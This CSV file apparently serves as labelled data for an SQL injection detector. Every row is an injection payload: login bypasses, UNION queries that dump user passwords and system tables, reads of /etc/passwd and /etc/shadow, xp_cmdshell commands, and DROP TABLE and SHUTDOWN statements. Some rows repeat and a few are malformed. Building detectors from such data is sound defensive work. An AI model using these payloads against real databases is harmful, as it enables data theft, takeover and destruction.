"payload","sql_injection"
"' OR 1=1 --","sql_injection"
"' OR '1'='1","sql_injection"
"' OR ''='' --","sql_injection"
"' OR 1=1#","sql_injection"
"' OR '1'='1' /*","sql_injection"
"' OR TRUE --","sql_injection"
"' OR 1=1 LIMIT 1; --","sql_injection"
"' OR 1=1; /*","sql_injection"
"' OR 1=1 UNION SELECT NULL --","sql_injection"
"admin' OR 1=1 --","sql_injection"
"' OR EXISTS(SELECT 1) --","sql_injection"
"' OR NOT 1=2 --","sql_injection"
"' OR 'test'='test' --","sql_injection"
"' OR 2>1 --","sql_injection"
"' OR IF(1=1,1,0) --","sql_injection"
"' OR SLEEP(3) --","sql_injection"
"' OR BENCHMARK(1000000,MD5(1)) --","sql_injection"
"' OR 1337=1337 --","sql_injection"
"' OR ascii(lower('A'))=97 --","sql_injection"
"' OR 1=1 ORDER BY 1 --","sql_injection"
"' OR 1=1 ORDER BY 5 --","sql_injection"
"' OR RAND() < 0.9 --","sql_injection"
"' OR TRUE AND 'a'='a","sql_injection"
"' OR CASE WHEN (1=1) THEN 1 ELSE 0 END --","sql_injection"
"' UNION SELECT NULL,NULL --","sql_injection"
"' UNION SELECT 1,2,3 --","sql_injection"
"' UNION SELECT username,password FROM users --","sql_injection"
"' UNION ALL SELECT NULL --","sql_injection"
"' UNION ALL SELECT table_name,NULL FROM information_schema.tables --","sql_injection"
"' UNION SELECT load_file('/etc/passwd') --","sql_injection"
"' UNION SELECT version() --","sql_injection"
"' UNION SELECT @@hostname --","sql_injection"
"' UNION SELECT @@datadir --","sql_injection"
"' UNION SELECT @@version_compile_os --","sql_injection"
"' UNION SELECT group_concat(schema_name) FROM information_schema.schemata --","sql_injection"
"' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --","sql_injection"
"' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users' --","sql_injection"
"' UNION SELECT null,concat(username,':',password) FROM users --","sql_injection"
"' UNION SELECT user(),database() --","sql_injection"
"' OR 1=1; EXEC xp_cmdshell('dir') --","sql_injection"
"' OR 1=1; EXEC xp_cmdshell 'whoami' --","sql_injection"
"' OR 1=1; EXEC master..xp_cmdshell 'ipconfig' --","sql_injection"
"' WAITFOR DELAY '0:0:5' --","sql_injection"
"' OR 1=1 WAITFOR DELAY '00:00:03' --","sql_injection"
"' OR 1=1; SHUTDOWN --","sql_injection"
"' OR 1=1; DROP TABLE users; --","sql_injection"
"' OR 1=1; UPDATE users SET admin=1 WHERE username='guest' --","sql_injection"
"' OR (SELECT COUNT(*) FROM users)>0 --","sql_injection"
"' OR 1 IN (SELECT 1) --","sql_injection"
"' OR 1 IN (SELECT password FROM users) --","sql_injection"
"' OR 1=(SELECT 1 FROM dual) --","sql_injection"
"' OR EXISTS(SELECT * FROM dual) --","sql_injection"
"' OR (SELECT @@version) LIKE '%' --","sql_injection"
"' OR ASCII(SUBSTRING(username,1,1))>64 --","sql_injection"
"' OR (SELECT SLEEP(2)) --","sql_injection"
"' OR SLEEP(5)#","sql_injection"
"' OR SLEEP(10)/*","sql_injection"
"' OR 1=1; SELECT * FROM credit_cards --","sql_injection"
"' OR 1=1; SELECT * FROM users INTO OUTFILE '/tmp/pwned.txt' --","sql_injection"
"' UNION SELECT NULL,LOAD_FILE('/etc/hosts') --","sql_injection"
"' UNION SELECT NULL,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts') --","sql_injection"
"' AND 1=CONVERT(int,(SELECT @@version)) --","sql_injection"
"' AND ASCII('A')=65 --","sql_injection"
"' AND LENGTH(database())>0 --","sql_injection"
"' AND (SELECT COUNT(*) FROM users)>0 --","sql_injection"
"' AND (SELECT username FROM users LIMIT 1)='admin' --","sql_injection"
"' OR LOWER(USER())='root' --","sql_injection"
"' OR MID((SELECT database()),1,1)='t' --","sql_injection"
"' OR ORD(SUBSTRING((SELECT user()),1,1))=114 --","sql_injection"
"' OR 1=1/**/","sql_injection"
"' OR 1=1#test","sql_injection"
"' OR/**/1=1/**/--","sql_injection"
"' OR 1=1-- -","sql_injection"
"' OR/**/(SELECT 1)--","sql_injection"
"'||'1'='1","sql_injection"
"admin') OR ('1'='1","sql_injection"
"1 OR 1=1","sql_injection"
"1 OR TRUE","sql_injection"
"1 OR 1=1 LIMIT 1","sql_injection"
"1 OR SLEEP(5)","sql_injection"
"1 OR BENCHMARK(500000,MD5(1))","sql_injection"
"1 OR IF(1=1,1,0)","sql_injection"
"1 OR IF(version() LIKE '%',1,0)","sql_injection"
"1 AND 1=1","sql_injection"
"1 AND ASCII('A')=65","sql_injection"
"1 AND sleep(3)#","sql_injection"
"1 AND SLEEP(5) --","sql_injection"
"1 WAITFOR DELAY '00:00:02'","sql_injection"
"1 AND 1=(SELECT COUNT(*) FROM users)","sql_injection"
"1 AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)","sql_injection"
"1 UNION SELECT NULL,NULL","sql_injection"
"1 UNION SELECT 1,@@version","sql_injection"
"1 UNION SELECT table_name FROM information_schema.tables","sql_injection"
"1 UNION SELECT group_concat(column_name) FROM information_schema.columns","sql_injection"
"1 UNION SELECT load_file('/etc/passwd')","sql_injection"
"1 UNION SELECT user(),database()","sql_injection"
"1 UNION SELECT NULL,version()","sql_injection"
"1 UNION SELECT SLEEP(3),2","sql_injection"
"1 AND 1=CONVERT(int,@@version)","sql_injection"
"1 AND CAST('1' AS INT)=1","sql_injection"
"1 AND (SELECT version()) LIKE '%'","sql_injection"
"1 AND (SELECT COUNT(*) FROM users)>0","sql_injection"
"1 AND (SELECT LENGTH(database()))>0","sql_injection"
"1;(SELECT * FROM users)","sql_injection"
"1; DROP TABLE users;","sql_injection"
"1; SHUTDOWN;","sql_injection"
"1; EXEC xp_cmdshell 'dir'","sql_injection"
"1; EXEC master..xp_cmdshell 'whoami'","sql_injection"
"1'; DROP TABLE logins; --","sql_injection"
"1'; UPDATE accounts SET balance=99999 --","sql_injection"
"1'; INSERT INTO admin(username,password) VALUES('hax','123') --","sql_injection"
"1'; SELECT * FROM bank_accounts --","sql_injection"
"1 OR (SELECT SLEEP(3))","sql_injection"
"' OR (SELECT SLEEP(1))","sql_injection"
"admin' OR SLEEP(2) --","sql_injection"
"' OR 1=1 UNION SELECT database(),user() --","sql_injection"
"' AND 1=(SELECT 1 FROM mysql.user LIMIT 1) --","sql_injection"
"' OR 1=1 UNION SELECT NULL,@@secure_file_priv --","sql_injection"
"' UNION SELECT NULL,NULL,NULL,NULL,NULL --","sql_injection"
"' UNION SELECT NULL,username,password FROM users --","sql_injection"
"' UNION SELECT NULL,version(),user() --","sql_injection"
"' OR JSON_EXTRACT('[1,1]','$[0]')=1 --","sql_injection"
"' OR JSON_EXTRACT('{\"a\":1}','$.a')=1 --","sql_injection"
"' OR CAST(version() AS CHAR) LIKE '%' --","sql_injection"
"' OR CONCAT('A','A')='AA' --","sql_injection"
"' OR LENGTH((SELECT database()))>1 --","sql_injection"
"' OR EXISTS(SELECT * FROM information_schema.columns) --","sql_injection"
"' AND (SELECT COUNT(*) FROM mysql.user)>0 --","sql_injection"
"' AND LENGTH(user())>0 --","sql_injection"
"' AND LENGTH((SELECT @@version))>1 --","sql_injection"
"' OR (SELECT LENGTH(database()))>1 --","sql_injection"
"' OR (SELECT LENGTH(user()))>1 --","sql_injection"
"' OR (SELECT LENGTH(@@version))>1 --","sql_injection"
"' OR (SELECT 1 FROM users WHERE username='admin')=1 --","sql_injection"
"' OR (SELECT SUBSTRING(@@version,1,1))='5' --","sql_injection"
"' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' --","sql_injection"
"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0 --","sql_injection"
"' AND LENGTH((SELECT group_concat(table_name) FROM information_schema.tables))>1 --","sql_injection"
"' AND IF((SELECT LENGTH(user()))>0,1,0) --","sql_injection"
"' OR IF((SELECT 'a'='a'),1,0) --","sql_injection"
"' OR IF((SELECT 1 FROM users LIMIT 1)=1,SLEEP(3),0) --","sql_injection"
"' AND IF((SELECT database()) LIKE '%',1,0) --","sql_injection"
"' OR CASE WHEN 1=1 THEN SLEEP(2) ELSE 0 END --","sql_injection"
"' OR 1 REGEXP '.*' --","sql_injection"
"' OR 'x' LIKE 'x%' --","sql_injection"
"' OR (SELECT 'a' FROM dual)='a' --","sql_injection"
"' OR 1 BETWEEN 1 AND 2 --","sql_injection"
"' OR 1 LIKE 1 --","sql_injection"
"' OR TRUE IS TRUE --","sql_injection"
"' OR FALSE != TRUE --","sql_injection"
"' OR NOT(FALSE) --","sql_injection"
"' OR 1<<1=2 --","sql_injection"
"' OR 2>>1=1 --","sql_injection"
"' OR 3&1=1 --","sql_injection"
"' OR 3|1=3 --","sql_injection"
"' OR (SELECT 1 FROM dual LIMIT 1)=1 --","sql_injection"
"' OR MOD(4,2)=0 --","sql_injection"
"' OR POW(2,2)=4 --","sql_injection"
"' OR RAND()=RAND() --","sql_injection"
"' OR EXP(2)=7.389056 --","sql_injection"
"' OR SQRT(4)=2 --","sql_injection"
"' OR CEIL(1.1)=2 --","sql_injection"
"' OR FLOOR(1.9)=1 --","sql_injection"
"' OR LENGTH('abc')=3 --","sql_injection"
"' OR CHAR_LENGTH('admin')=5 --","sql_injection"
"' OR LOCATE('a','admin')=1 --","sql_injection"
"' OR INSTR('hello','e')=2 --","sql_injection"
"' OR FIND_IN_SET('root','root,user')>0 --","sql_injection"
"' OR 'a' IN ('a','b','c') --","sql_injection"
"' OR 1 IN (SELECT 1 FROM dual) --","sql_injection"
"' OR 'admin'=(SELECT username FROM users LIMIT 1) --","sql_injection"
"' OR (SELECT COUNT(*) FROM information_schema.tables)>0 --","sql_injection"
"' OR (SELECT table_name FROM information_schema.tables LIMIT 1) LIKE '%' --","sql_injection"
"' OR COALESCE(NULL,1)=1 --","sql_injection"
"' OR NULLIF(1,2)=1 --","sql_injection"
"' OR GREATEST(1,2)=2 --","sql_injection"
"' OR LEAST(1,2)=1 --","sql_injection"
"' OR BIT_COUNT(7)=3 --","sql_injection"
"' AND (SELECT 1337)=1337 --","sql_injection"
"' AND (SELECT UPPER('a'))='A' --","sql_injection"
"' AND (SELECT LOWER('A'))='a' --","sql_injection"
"' OR CAST(1 AS SIGNED)=1 --","sql_injection"
"' OR CAST('a' AS CHAR)='a' --","sql_injection"
"' OR TRUE/*test*/","sql_injection"
"' OR FALSE/*test*/","sql_injection"
"' OR 1=1--random","sql_injection"
"' OR 1=1--/**/","sql_injection"
"' OR/**/1/**/=/**/1 --","sql_injection"
"'||(SELECT 1)||'","sql_injection"
"' || '1'='1","sql_injection"
"admin'||'1'='1","sql_injection"
"' OR 1=1 USING UTF8 --","sql_injection"
"' OR 1=1 COLLATE utf8_general_ci --","sql_injection"
"' OR 1=1 COLLATE latin1_swedish_ci --","sql_injection"
"' UNION SELECT hex(version()) --","sql_injection"
"' UNION SELECT unhex('2f6574632f706173737764') --","sql_injection"
"' UNION SELECT TO_BASE64(load_file('/etc/passwd')) --","sql_injection"
"' UNION SELECT FROM_BASE64('cm9vdDo6MA==') --","sql_injection"
"' UNION SELECT MD5('test') --","sql_injection"
"' UNION SELECT SHA1('test') --","sql_injection"
"' UNION SELECT SHA2('test',256) --","sql_injection"
"' AND MD5('a')='0cc175b9c0f1b6a831c399e269772661' --","sql_injection"
"' AND SHA1('a')='86f7e437faa5a7fce15d1ddcb9eaeaea377667b8' --","sql_injection"
"' OR ASCII('A') BETWEEN 65 AND 90 --","sql_injection"
"' OR ASCII('a') BETWEEN 97 AND 122 --","sql_injection"
"' OR ASCII(SUBSTRING((SELECT user()),1,1))>50 --","sql_injection"
"' OR (SELECT LENGTH(user()))>3 --","sql_injection"
"' OR LEFT(user(),1)='r' --","sql_injection"
"' OR RIGHT(database(),1)='m' --","sql_injection"
"' OR SUBSTRING(database(),1,3)='adm' --","sql_injection"
"' OR MID(database(),1,3)='tes' --","sql_injection"
"' OR OCTET_LENGTH(database())>3 --","sql_injection"
"' OR QUOTE(user()) LIKE '%@%' --","sql_injection"
"' OR (SELECT user()) REGEXP 'root' --","sql_injection"
"' OR 'abc' REGEXP 'a.*' --","sql_injection"
"' OR (SELECT schema_name FROM information_schema.schemata LIMIT 1) REGEXP '.*' --","sql_injection"
"' OR (SELECT 1 FROM information_schema.columns LIMIT 1)=1 --","sql_injection"
"' OR EXISTS(SELECT schema_name FROM information_schema.schemata WHERE schema_name LIKE '%') --","sql_injection"
"' AND (SELECT COUNT(*) FROM mysql.user)>0 --","sql_injection"
"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0 --","sql_injection"
"' AND (SELECT LENGTH(group_concat(table_name)) FROM information_schema.tables)>0 --","sql_injection"
"' OR CASE WHEN (1=1) THEN 1 ELSE 2 END=1 --","sql_injection"
"' OR IFNULL(NULL,1)=1 --","sql_injection"
"' OR NULLIF(1,1) IS NULL --","sql_injection"
"' OR IFNULL((SELECT 1),0)=1 --","sql_injection"
"' OR 1=CAST('1' AS UNSIGNED) --","sql_injection"
"' OR COALESCE(1,2)=1 --","sql_injection"
"' OR 1 LIKE BINARY '1' --","sql_injection"
"' OR STRCMP('a','a')=0 --","sql_injection"
"' OR STRCMP('a','b')!=0 --","sql_injection"
"' OR (SELECT LENGTH(@@version))>1 --","sql_injection"
"' OR (SELECT LENGTH(@@hostname))>1 --","sql_injection"
"' UNION SELECT banner FROM v$version --","sql_injection"
"' UNION SELECT name FROM v$database --","sql_injection"
"' UNION SELECT username FROM all_users --","sql_injection"
"' UNION SELECT table_name FROM all_tables --","sql_injection"
"' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS' --","sql_injection"
"' UNION SELECT password FROM SYS.USER$ --","sql_injection"
"' UNION SELECT * FROM v$pwfile_users --","sql_injection"
"' OR 1=1--oracle","sql_injection"
"' OR 1=1--mssql","sql_injection"
"' OR 1=1--mysql","sql_injection"
"' OR 1=1--postgres","sql_injection"
"' OR 1=1--sqlite","sql_injection"
"' OR (SELECT count(*) FROM pg_user)>0 --","sql_injection"
"' UNION SELECT usename,passwd FROM pg_shadow --","sql_injection"
"' UNION SELECT version(),current_database() --","sql_injection"
"' UNION SELECT tablename FROM pg_tables --","sql_injection"
"' OR EXISTS(SELECT relname FROM pg_class) --","sql_injection"
"' OR (SELECT pg_sleep(3)) --","sql_injection"
"' OR CAST((SELECT version()) AS TEXT) LIKE '%' --","sql_injection"
"' OR EXISTS(SELECT * FROM sqlite_master) --","sql_injection"
"' UNION SELECT sql FROM sqlite_master --","sql_injection"
"' OR (SELECT sqlite_version()) LIKE '%' --","sql_injection"
"' OR instr(sqlite_version(),'3')>0 --","sql_injection"
"' OR (SELECT group_concat(name) FROM sqlite_master)>'' --","sql_injection"
"' OR 1=1 AND RANDOM()>-1 --","sql_injection"
"' OR (SELECT RAISE(IGNORE)) --","sql_injection"
"' --+OR+1=1","sql_injection"
"' OR 1=1;--","sql_injection"
"' OR 1=1;%00","sql_injection"
"' OR TRUE;%00","sql_injection"
"' OR ''=''%00","sql_injection"
"'/**/OR/**/1/**/=/**/1 --","sql_injection"
"' OR 1=1%23","sql_injection"
"' OR SLEEP(3)%23","sql_injection"
"' OR BENCHMARK(1000000,MD5(1))%23","sql_injection"
"' OR IF(1=1,1,0)%23","sql_injection"
"' OR 1=1--+","sql_injection"
"' OR 1=1-- -","sql_injection"
"' OR 1=1/***/","sql_injection"
"' UNION/**/SELECT/**/NULL --","sql_injection"
"' UNION/**/SELECT/**/1,2 --","sql_injection"
"' UNION/**/SELECT/**/table_name FROM information_schema.tables --","sql_injection"
"' OR 1=1 AND 'a'='a --","sql_injection"
"' OR 'a'='a AND 'b'='b --","sql_injection"
"' OR 1=1 AND SLEEP(1) --","sql_injection"
"' OR 1=1 AND BENCHMARK(10000,MD5(1)) --","sql_injection"
"' OR (SELECT COUNT(*) FROM users WHERE username='admin')>0 --","sql_injection"
"' OR (SELECT LENGTH(password) FROM users LIMIT 1)>0 --","sql_injection"
"' OR (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)>'0' --","sql_injection"
"' OR 1=1 AND EXISTS(SELECT 1) --","sql_injection"
"' OR EXISTS(SELECT * FROM users WHERE username LIKE '%') --","sql_injection"
"' OR EXISTS(SELECT * FROM mysql.user WHERE user='root') --","sql_injection"
"' OR (SELECT table_schema FROM information_schema.tables LIMIT 1) LIKE '%' --","sql_injection"
"' OR 1=(SELECT 1 FROM dual) --","sql_injection"
"' OR (SELECT @@GLOBAL.max_connections)>0 --","sql_injection"
"' OR (SELECT @@GLOBAL.hostname) LIKE '%' --","sql_injection"
"' UNION SELECT @@GLOBAL.sql_mode --","sql_injection"
"' UNION SELECT @@GLOBAL.time_zone --","sql_injection"
"' OR 1=1 AND CONNECTION_ID()>0 --","sql_injection"
"' OR (SELECT CONNECTION_ID())>0 --","sql_injection"
"' OR (SELECT SLEEP(1)) --","sql_injection"
"' OR (SELECT SLEEP(2)) --","sql_injection"
"' OR (SELECT SLEEP(3)) --","sql_injection"
"' OR (SELECT SLEEP(0.5)) --","sql_injection"
"' AND IF(1=1,SLEEP(1),0) --","sql_injection"
"' AND IF((SELECT LENGTH(database()))>1,SLEEP(2),0) --","sql_injection"
"' AND IF((SELECT LENGTH(user()))>1,SLEEP(3),0) --","sql_injection"
"' AND IF((SELECT 1 FROM users LIMIT 1)=1,SLEEP(1),0) --","sql_injection"
"' OR CASE WHEN (SELECT 1)=1 THEN SLEEP(2) END --","sql_injection"
"' OR MAKE_SET(1,'a','b')='a' --","sql_injection"
"' OR FIELD('a','a','b','c')=1 --","sql_injection"
"' OR FIND_IN_SET('root','root,user')>0 --","sql_injection"
"' OR JSON_LENGTH('[1,2]')=2 --","sql_injection"
"' OR JSON_CONTAINS('[1,2]','1') --","sql_injection"
"' OR JSON_CONTAINS_PATH('{\"a\":1}','one','$.a') --","sql_injection"
"' OR JSON_EXTRACT('{\"x\":5}','$.x')=5 --","sql_injection"
"' OR JSON_EXTRACT('[\"a\",\"b\"]','$[0]')='a' --","sql_injection"
"' OR JSON_KEYS('{\"a\":1}') LIKE '%' --","sql_injection"
"' OR JSON_DEPTH('[1,2]')>0 --","sql_injection"
"' OR JSON_TYPE('1')='INTEGER' --","sql_injection"
"' OR JSON_VALID('{\"a\":1}')=1 --","sql_injection"
"' OR LENGTH(JSON_ARRAY(1,2,3))>0 --","sql_injection"
"' OR JSON_SEARCH('[\"x\",\"y\"]','one','x') IS NOT NULL --","sql_injection"
"' UNION SELECT JSON_ARRAYAGG(table_name) FROM information_schema.tables --","sql_injection"
"' UNION SELECT JSON_OBJECT('user',user(),'db',database()) --","sql_injection"
"' OR 1=1 AND JSON_EXTRACT('{\"a\":true}','$.a')=true --","sql_injection"
"' OR 1=1 AND JSON_EXTRACT('[10,20]','$[1]')=20 --","sql_injection"
"' OR 1=1 AND JSON_EXTRACT('[\"root\"]','$[0]')='root' --","sql_injection"
"' OR 1=1 AND JSON_EXTRACT('[{\"a\":1}]','$[0].a')=1 --","sql_injection"
"' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL --","sql_injection"
"' UNION SELECT table_schema,table_name,column_name,NULL,NULL,NULL FROM information_schema.columns --","sql_injection"
"' UNION SELECT group_concat(user),group_concat(host) FROM mysql.user --","sql_injection"
"' UNION SELECT schema_name,NULL FROM information_schema.schemata --","sql_injection"
"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='accounts' --","sql_injection"
"' UNION SELECT * FROM information_schema.user_privileges --","sql_injection"
"' OR EXISTS(SELECT * FROM mysql.user WHERE password!='') --","sql_injection"
"' OR EXISTS(SELECT * FROM users WHERE length(password)>0) --","sql_injection"
"' OR EXISTS(SELECT host FROM mysql.user WHERE host='%') --","sql_injection"
"' OR EXISTS(SELECT table_name FROM information_schema.tables WHERE table_schema!='information_schema') --","sql_injection"
"' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name LIKE '%user%') --","sql_injection"
"' OR TRUE AND EXISTS(SELECT version()) --","sql_injection"
"' OR 1=1 AND database() LIKE '%' --","sql_injection"
"' OR database() IN (SELECT schema_name FROM information_schema.schemata) --","sql_injection"
"' OR user() IN (SELECT user FROM mysql.user) --","sql_injection"
"' OR length((SELECT table_name FROM information_schema.tables LIMIT 1))>0 --","sql_injection"
"' AND length((SELECT schema_name FROM information_schema.schemata LIMIT 1))>0 --","sql_injection"
"' AND ascii(substr((SELECT database()),1,1))>0 --","sql_injection"
"' AND ascii(substr((SELECT user()),1,1))>0 --","sql_injection"
"' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>=1 --","sql_injection"
"' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())>=1 --","sql_injection"
"' OR (SELECT COUNT(*) FROM information_schema.schemata)>=1 --","sql_injection"
"' OR (SELECT LENGTH(CONCAT(user(),database())))>0 --","sql_injection"
"' OR (SELECT LENGTH(GROUP_CONCAT(schema_name)))>0 --","sql_injection"
"' OR (SELECT LENGTH(GROUP_CONCAT(table_name)))>0 --","sql_injection"
"' OR (SELECT LENGTH(GROUP_CONCAT(column_name)))>0 --","sql_injection"
"' OR (SELECT LENGTH(@@version)))>0 --","sql_injection"
"' UNION SELECT NULL,CONCAT(user(),0x3a,database()) --","sql_injection"
"' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database() --","sql_injection"
"' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users' --","sql_injection"
"' UNION SELECT NULL,password FROM users WHERE username='admin' --","sql_injection"
"' UNION SELECT NULL,@@datadir --","sql_injection"
"' UNION SELECT NULL,@@secure_file_priv --","sql_injection"
"' UNION SELECT NULL,@@plugin_dir --","sql_injection"
"' UNION SELECT NULL,@@tmpdir --","sql_injection"
"' UNION SELECT NULL,version() --","sql_injection"
"' UNION SELECT NULL,user() --","sql_injection"
"' UNION SELECT NULL,database() --","sql_injection"
"' UNION SELECT NULL,uuid() --","sql_injection"
"' UNION SELECT NULL,hex(user()) --","sql_injection"
"' UNION SELECT NULL,hex(database()) --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/passwd'),NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/shadow'),NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('/etc/hosts'),NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('/proc/version'),NULL --","sql_injection"
"' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini'),NULL --","sql_injection"
"' UNION SELECT NULL,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts') --","sql_injection"
"' OR 1=1; SELECT user,password FROM mysql.user --","sql_injection"
"' OR 1=1; SELECT * FROM users --","sql_injection"
"' OR 1=1; SELECT * FROM accounts --","sql_injection"
"' OR 1=1; SELECT * FROM credit_cards --","sql_injection"
"' OR 1=1; SELECT * FROM secrets --","sql_injection"
"' OR 1=1; SELECT * FROM logs --","sql_injection"
"' OR 1=1; SELECT * FROM admin --","sql_injection"
"' OR 1=1; SELECT * FROM auth --","sql_injection"
"' OR 1=1; SELECT * FROM tokens --","sql_injection"
"' OR 1=1; SELECT * FROM passwords --","sql_injection"
"' OR 1=1; DROP TABLE users --","sql_injection"
"' OR 1=1; DROP TABLE accounts --","sql_injection"
"' OR 1=1; DROP TABLE logs --","sql_injection"
"' OR 1=1; DROP TABLE admin --","sql_injection"
"' OR 1=1; DROP TABLE secrets --","sql_injection"
"' OR 1=1; #","sql_injection"
"' OR 1=1;%00","sql_injection"
"' OR 1=1;%23","sql_injection"
"' OR 1=1;%2D%2D","sql_injection"
"' OR 1=1%20--","sql_injection"
"' OR TRUE%20--","sql_injection"
"' OR ''=''%20--","sql_injection"
"' OR 1/*comment*/=/*comment*/1 --","sql_injection"
"' OR/**/1=1;--","sql_injection"
"'/**/OR/**/1=1/**/--","sql_injection"
"' OR 1=1 UNION/**/SELECT/**/NULL --","sql_injection"
"' OR SLEEP(2)/**/--","sql_injection"
"' OR BENCHMARK(10000,MD5(1))/**/--","sql_injection"
"' OR IF(1=1,1,0)/**/--","sql_injection"
"' OR 1=1; EXEC xp_cmdshell 'whoami' --","sql_injection"
"' OR 1=1; EXEC xp_cmdshell 'dir C:\\' --","sql_injection"
"' OR 1=1; EXEC master..xp_cmdshell 'type C:\\boot.ini' --","sql_injection"
"' OR 1=1; EXEC master..xp_cmdshell 'ipconfig /all' --","sql_injection"
"' OR 1=1; EXEC master..xp_cmdshell 'net user' --","sql_injection"
"' OR 1=1; WAITFOR DELAY '00:00:03' --","sql_injection"
"' OR 1=1; WAITFOR TIME '00:00:10' --","sql_injection"
"' OR 1=1; WAITFOR DELAY '00:00:05'--","sql_injection"
"' OR 1=1; SHUTDOWN WITH NOWAIT --","sql_injection"
"' OR 1=1; SHUTDOWN --","sql_injection"
"' OR 1=1; KILL QUERY 1 --","sql_injection"
"' OR 1=1; KILL CONNECTION 3 --","sql_injection"
"' OR host='localhost' --","sql_injection"
"' OR user() LIKE '%' --","sql_injection"
"' OR database() LIKE '%' --","sql_injection"
"' OR version() LIKE '%' --","sql_injection"
"' OR current_user LIKE '%' --","sql_injection"
"' OR session_user LIKE '%' --","sql_injection"
"' OR system_user LIKE '%' --","sql_injection"
"' OR current_database() LIKE '%' --","sql_injection"
"' OR current_schema() LIKE '%' --","sql_injection"
"' OR EXISTS(SELECT version()) --","sql_injection"
"' OR EXISTS(SELECT current_database()) --","sql_injection"
"' OR EXISTS(SELECT column_name FROM information_schema.columns) --","sql_injection"
"' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '%') --","sql_injection"
"' OR EXISTS(SELECT 1 FROM mysql.user WHERE user LIKE '%') --","sql_injection"
"' OR EXISTS(SELECT 1 FROM pg_user LIMIT 1) --","sql_injection"
"' OR EXISTS(SELECT 1 FROM sqlite_master LIMIT 1) --","sql_injection"
"' OR RANDOM()>0 --","sql_injection"
"' OR RANDOM()=RANDOM() --","sql_injection"
"' OR ABS(-1)=1 --","sql_injection"
"' OR COALESCE(NULL,version()) LIKE '%' --","sql_injection"
"' OR NULLIF(1,2)=1 AND 1=1 --","sql_injection"
"' OR NULLIF(user(),'') IS NOT NULL --","sql_injection"
"' OR 1 BETWEEN 1 AND 2 --","sql_injection"
"' OR 2 BETWEEN 1 AND 3 --","sql_injection"
"' OR 1 IN (1,2,3) --","sql_injection"
"' OR 'admin' IN (SELECT username FROM users) --","sql_injection"
"' OR 'root' IN (SELECT user FROM mysql.user) --","sql_injection"
"' OR EXISTS(SELECT password FROM users) --","sql_injection"
"' OR 1=1 AND LENGTH((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata))>0 --","sql_injection"
"' OR 1=1 AND LENGTH((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables))>0 --","sql_injection"
"' OR 1=1 AND LENGTH((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns))>0 --","sql_injection"
"' OR (SELECT LENGTH(user()))>1 --","sql_injection"
"' OR (SELECT LENGTH(database()))>1 --","sql_injection"
"' OR (SELECT LENGTH(@@version))>1 --","sql_injection"
"' OR ASCII(SUBSTRING((SELECT database()),1,1))>0 --","sql_injection"
"' OR ASCII(SUBSTRING((SELECT user()),1,1))>0 --","sql_injection"
"' OR convert((SELECT user()) USING utf8) LIKE '%' --","sql_injection"
"' OR CONVERT((SELECT database()) USING utf8) LIKE '%' --","sql_injection"
"' OR CONVERT((SELECT @@version) USING utf8) LIKE '%' --","sql_injection"
"' OR CAST((SELECT database()) AS CHAR) LIKE '%' --","sql_injection"
"' OR CAST((SELECT user()) AS CHAR) LIKE '%' --","sql_injection"
"' OR CAST((SELECT @@version) AS CHAR) LIKE '%' --","sql_injection"
"' OR CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS CHAR) LIKE '%' --","sql_injection"
"' OR CAST((SELECT column_name FROM information_schema.columns LIMIT 1) AS CHAR) LIKE '%' --","sql_injection"
"' OR CONCAT_WS(':',user(),database(),version()) LIKE '%' --","sql_injection"
"' OR CONCAT(user(),database()) LIKE '%' --","sql_injection"
"' OR CONCAT(user(),':',database()) LIKE '%' --","sql_injection"
"' OR CONCAT(database(),',',user()) LIKE '%' --","sql_injection"
"' OR CONCAT(version(),database()) LIKE '%' --","sql_injection"
"' OR CONCAT(version(),user()) LIKE '%' --","sql_injection"
"' OR version() REGEXP '.' --","sql_injection"
"' OR database() REGEXP '.' --","sql_injection"
"' OR user() REGEXP '.' --","sql_injection"
"' OR (SELECT version()) REGEXP '.' --","sql_injection"
"' OR (SELECT database()) REGEXP '.' --","sql_injection"
"' OR (SELECT user()) REGEXP '.' --","sql_injection"
"' OR tablename REGEXP '.*' FROM pg_tables --","sql_injection"
"' OR EXISTS(SELECT * FROM users WHERE username='admin') --","sql_injection"
"' OR EXISTS(SELECT * FROM accounts WHERE balance>0) --","sql_injection"
"' OR EXISTS(SELECT * FROM credit_cards LIMIT 1) --","sql_injection"
"' OR EXISTS(SELECT * FROM logs LIMIT 1) --","sql_injection"
"' OR EXISTS(SELECT * FROM admin LIMIT 1) --","sql_injection"
"' OR 1=1 AND (SELECT COUNT(*) FROM pg_tables)>0 --","sql_injection"
"' OR 1=1 AND (SELECT COUNT(*) FROM sqlite_master)>0 --","sql_injection"
"' UNION SELECT name,NULL FROM sqlite_master WHERE type='table' --","sql_injection"
"' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' --","sql_injection"
"' UNION SELECT type,name FROM sqlite_master --","sql_injection"
"' OR COALESCE((SELECT name FROM sqlite_master LIMIT 1),'x') LIKE '%' --","sql_injection"
"' OR LENGTH((SELECT sql FROM sqlite_master LIMIT 1))>0 --","sql_injection"
"' OR (SELECT quote(version())) LIKE '%' --","sql_injection"
